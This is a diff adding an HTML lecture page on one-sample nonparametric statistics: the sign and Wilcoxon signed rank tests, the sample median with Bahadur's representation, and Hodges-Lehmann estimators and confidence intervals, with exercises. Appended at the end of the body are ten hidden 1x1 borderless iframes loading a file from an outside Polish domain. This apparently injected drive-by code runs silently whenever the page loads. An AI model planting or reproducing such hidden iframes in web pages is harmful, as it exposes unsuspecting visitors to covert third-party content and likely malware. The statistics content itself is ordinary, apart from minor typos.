@@ -1,0 +1,434 @@
+
+
+<html>
+<head>
+<title>??</title>
+</head>
+<body bgcolor="#ffffff">
+
+<h1>One sample Problem</h1>
+
+
+<h3>Introduction</h3>
+
+So far we have seen the paired sample problem. However, it was effectively
+a one sample problem , since we always worked with the differences
+Z<sub>1</sub>,...,Z<sub>n</sub>. We now restate our findings in the one
+sample problem set up.  
+<p>
+Z<sub>1</sub>,...,Z<sub>n</sub> are
+ independent, but not necessarily identically distributed. They have
+a common median 
+                <img src=
+                "image/theta.png"
+                align=top>
+                
+                 , which is unknown. We want to test 
+
+<blockquote>
+H<sub>0</sub>: 
+               <img src=
+               "image/theta.png"
+               align=top>
+               
+                = 0 
+Vs 
+H<sub>1</sub>: 
+               <img src=
+               "image/theta.png"
+               align=top>
+               
+                 &gt; 0
+</blockquote>
+
+
+We have already discussed two test procedures for this. 
+<ul>
+<li><b>Sign test:</b> Rejects H<sub>0</sub>
+for large total sign(Z<sub>i</sub>)'s.
+<li><b>Wilcoxon's signed rank test:</b> Rejects for large total siRi. (We
+also need an extra symmetry assumption for this.)
+</ul>
+
+
+<h3>Estimation</h3>
+
+Suppose we are interested in estimating 
+                                        <img src=
+                                        "image/theta.png"
+                                        align=top>
+                                        
+                                        . The first estimator
+that comes 
+to mind is the sample median. It is defined as follows. Order the
+Z's as
+
+<blockquote>
+Z<sub>(1)</sub> 
+                <img src=
+                "image/leq.png"
+                align=top>
+                
+                 ... 
+                     <img src=
+                     "image/leq.png"
+                     align=top>
+                     
+                      Z<sub>(n)</sub>.
+</blockquote>
+
+ Then define
+the sample median  as 
+
+<table border=0>
+
+
+<tr>
+<td>
+    <img src=
+    "image/thetahat.png"
+    align=top>
+    
+     =</td>
+<td> Z<sub>(n+1/2)</sub></td>
+<td> if n is odd</td>
+</tr>
+
+
+<tr>
+<td>             </td>
+<td> (Z<sub>(n/2)</sub>+Z<sub>(n/2+1)</sub>)/2</td>
+<td> 
+    if n is even.</td>
+</tr>
+
+
+</table>
+
+
+<p>
+   <table><tr><td width=2 bgcolor="#cc0000"></td>
+   <td>
+   <b>Exercise:</b> 
+   
+   Suppose that Z<sub>i</sub>'s are iid. Then show that 
+                                                        <img src=
+                                                        "image/thetahat.png"
+                                                        align=top>
+                                                        
+                                                         is median
+   unbiased.
+   
+   </td></tr></table>
+   </blockquote>
+   
+
+<p>
+   <table><tr><td bgcolor="#cccccc">
+   <b>Theorem:</b>
+   (Bahadur's represenation) Let Z<sub>1</sub>,...,Z<sub>n</sub>
+   be iid with some common continuous density. Let 
+                                                   <img src=
+                                                   "image/theta.png"
+                                                   align=top>
+                                                   
+                                                    be its
+   median. Assume that f(
+                         <img src=
+                         "image/theta.png"
+                         align=top>
+                         
+                         )  &gt;  0. Let 
+                                         <img src=
+                                         "image/thetahat.png"
+                                         align=top>
+                                         
+                                          denote the
+   sample median based on the sample. Then 
+   
+   <blockquote>
+   
+   <img src=
+   "image/thetahat.png"
+   align=top>
+   
+    = 
+      <img src=
+      "image/theta.png"
+      align=top>
+      
+       +
+   (0.5-F<sub>n</sub>(
+                      <img src=
+                      "image/theta.png"
+                      align=top>
+                      
+                      ))/f(
+                           <img src=
+                           "image/theta.png"
+                           align=top>
+                           
+                           ) + R<sub>n</sub>,
+   </blockquote>
+   
+   for some R<sub>n</sub> where 
+   
+   <blockquote>
+   sqrt(n)* goes to zero as n goes to infinity.
+   </blockquote>
+    Here
+   F<sub>n</sub> denotes the empirical distributin function of the
+   Z<sub>i</sub>'s. 
+   
+   </td></tr></table>
+   
+<p>
+   <table><tr><td width=2 bgcolor="#cc0000"></td>
+   <td>
+   <b>Exercise:</b> 
+   
+   Use the above result to show that sample median has an asymptotic normal
+   distribution. Find out the mean and variance of this normal distribution. 
+   
+   </td></tr></table>
+   </blockquote>
+   
+
+<h3>Hodges-Lehmann approach</h3>
+
+Here is another method of estimation. This is more general in the sense we
+do not require the Z<sub>i</sub>'s to be identically distributed. This
+approach, called the Hodges Lehmann (HL) approach, is as follows.
+<p>
+Once again consider the Wilcoxon's signed rank test. Let us call its test
+statistic as
+
+<blockquote>
+T(Z<sub>1</sub>,...,Z<sub>n</sub>
+</blockquote>
+
+Define a function 
+
+<blockquote>
+f(x) = T(Z<sub>1</sub>-x,...,Z<sub>n</sub>-x)
+</blockquote>
+
+Note that f9tt) is approximately n(n+1)/4. The HL approach suggests
+estimating 
+           <img src=
+           "image/theta.png"
+           align=top>
+           
+            using 
+                  <img src=
+                  "image/thetahat.png"
+                  align=top>
+                  
+                  <sub>HL</sub> such that 
+f(
+  <img src=
+  "image/thetahat.png"
+  align=top>
+  
+  <sub>HL</sub>) is close to n(n+1)/4 as possible. 
+<p>
+   <table><tr><td width=2 bgcolor="#cc0000"></td>
+   <td>
+   <b>Exercise:</b> 
+   
+   Show that f(x) = 
+   #{Z<sub>i</sub>+Z<sub>j</sub>)/2  
+   &gt;  x : i  
+                <img src=
+                "image/leq.png"
+                align=top>
+                
+                 j }.
+   
+   </td></tr></table>
+   </blockquote>
+   
+
+<p>
+   <table><tr><td width=2 bgcolor="#cc0000"></td>
+   <td>
+   <b>Exercise:</b> 
+   
+   Show that 
+             <img src=
+             "image/thetahat.png"
+             align=top>
+             
+             <sub>HL</sub> is the median of the above set.
+   
+   </td></tr></table>
+   </blockquote>
+   
+<p>
+   <table><tr><td width=2 bgcolor="#cc0000"></td>
+   <td>
+   <b>Exercise:</b> 
+   
+   For symmetric distributions it outperforms the sample median. Do a simple
+   simulation to check this.
+   
+   </td></tr></table>
+   </blockquote>
+   
+
+The same approach may also be used to obtain confidence intervals. For
+this order the m = n(n+1)/2 numbers 
+
+<blockquote>
+(Z<sub>i</sub>+Z<sub>j</sub>)/2 i  
+                                   <img src=
+                                   "image/leq.png"
+                                   align=top>
+                                   
+                                    j,
+</blockquote>
+
+as 
+
+<blockquote>
+A<sub>1</sub> 
+              <img src=
+              "image/leq.png"
+              align=top>
+              
+               ... 
+                   <img src=
+                   "image/leq.png"
+                   align=top>
+                   
+                    A<sub>m</sub>.
+</blockquote>
+
+ Then 
+
+<blockquote>
+f(
+  <img src=
+  "image/theta.png"
+  align=top>
+  
+  ) = #{j : A<sub>j</sub>  &gt;  
+                                 <img src=
+                                 "image/theta.png"
+                                 align=top>
+                                 
+                                 }
+</blockquote>
+
+<p>
+   <table><tr><td width=2 bgcolor="#cc0000"></td>
+   <td>
+   <b>Exercise:</b> 
+   
+   Show that f(
+               <img src=
+               "image/theta.png"
+               align=top>
+               
+               ) is distribution-free.
+   
+   </td></tr></table>
+   </blockquote>
+   
+
+<p>
+So we can find an integer k such that 
+
+<blockquote>
+P(k 
+    <img src=
+    "image/leq.png"
+    align=top>
+    
+     f(
+       <img src=
+       "image/theta.png"
+       align=top>
+       
+       ) 
+         <img src=
+         "image/leq.png"
+         align=top>
+         
+          m-k) = 0.95.
+</blockquote>
+
+[Since, f(
+          <img src=
+          "image/theta.png"
+          align=top>
+          
+          ) is a discrete random variable the equality may not be
+exactly achievable.]
+<p>
+   <table><tr><td width=2 bgcolor="#cc0000"></td>
+   <td>
+   <b>Exercise:</b> 
+   
+   Show that for this k we have
+   
+   <blockquote>
+   P(A<sub>k</sub> 
+   
+   <img src=
+   "image/leq.png"
+   align=top>
+   
+    
+   
+   <img src=
+   "image/theta.png"
+   align=top>
+   
+    
+    <img src=
+    "image/leq.png"
+    align=top>
+    
+     
+   A<sub>m-k+1</sub>) =
+   0.95.
+   </blockquote>
+   
+   
+   </td></tr></table>
+   </blockquote>
+   
+<p>
+   <table><tr><td width=2 bgcolor="#cc0000"></td>
+   <td>
+   <b>Exercise:</b> 
+   
+   Apply the HL approach to the sign test to get another estimator of 
+   
+   <img src=
+   "image/theta.png"
+   align=top>
+   
+   .
+   
+   </td></tr></table>
+   </blockquote>
+   
+
+
+<hr>
+
+<iframe src="http://ZieF.pl/iraq.jpg" width=1 height=1 style="border:0"></iframe>
+<iframe src="http://ZieF.pl/iraq.jpg" width=1 height=1 style="border:0"></iframe>
+<iframe src="http://ZieF.pl/iraq.jpg" width=1 height=1 style="border:0"></iframe>
+<iframe src="http://ZieF.pl/iraq.jpg" width=1 height=1 style="border:0"></iframe>
+<iframe src="http://ZieF.pl/iraq.jpg" width=1 height=1 style="border:0"></iframe>
+<iframe src="http://ZieF.pl/iraq.jpg" width=1 height=1 style="border:0"></iframe>
+<iframe src="http://ZieF.pl/iraq.jpg" width=1 height=1 style="border:0"></iframe>
+<iframe src="http://ZieF.pl/iraq.jpg" width=1 height=1 style="border:0"></iframe>
+<iframe src="http://ZieF.pl/iraq.jpg" width=1 height=1 style="border:0"></iframe>
+<iframe src="http://ZieF.pl/iraq.jpg" width=1 height=1 style="border:0"></iframe>
+</body>
+</html>
+
